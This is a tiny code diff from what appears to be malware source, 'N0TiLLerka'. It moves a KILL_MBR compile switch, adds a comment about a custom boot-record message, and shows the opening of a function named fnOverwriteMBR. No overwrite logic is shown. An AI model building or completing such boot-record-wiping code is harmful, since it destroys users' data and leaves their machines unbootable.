@@ -1,6 +1,7 @@
 #include "../../../HeaderFiles/N0TiLLerka.h"
-#ifdef KILL_MBR
 
+#ifdef KILL_MBR
+// at somepoint I might implement a custom MBR displaying a message
 #define MBR_SIZE 512
 
 BOOL fnOverwriteMBR(VOID) {
